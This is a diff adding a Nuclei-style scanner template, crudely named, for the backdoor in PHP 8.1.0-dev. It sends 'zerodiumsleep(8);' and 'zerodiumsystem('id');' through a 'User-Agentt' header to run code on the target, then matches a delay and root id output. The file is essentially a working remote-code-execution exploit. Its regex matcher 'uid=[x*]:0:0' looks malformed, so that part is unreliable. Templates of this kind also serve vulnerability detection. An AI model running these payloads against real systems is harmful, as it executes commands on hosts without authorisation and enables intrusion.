@@ -1,0 +1,28 @@
+id: vunl-boss
+info:
+  name: Ngentot
+  author: banditz Cyber
+  severity: critical
+  description: |
+    badnitz cyber test zerodiums PHP/8.1.0-dev windows
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    headers:
+        Content-Type: application/x-www-form-urlencoded
+        User-Agentt: '{{reflection}}'
+    payloads:
+      reflection:
+        - 'zerodiumsleep(8);'
+        - "zerodiumsystem('id');"
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=7'
+        condition: and
+      - type: regex
+        regex:
+          - "uid=[x*]:0:0"
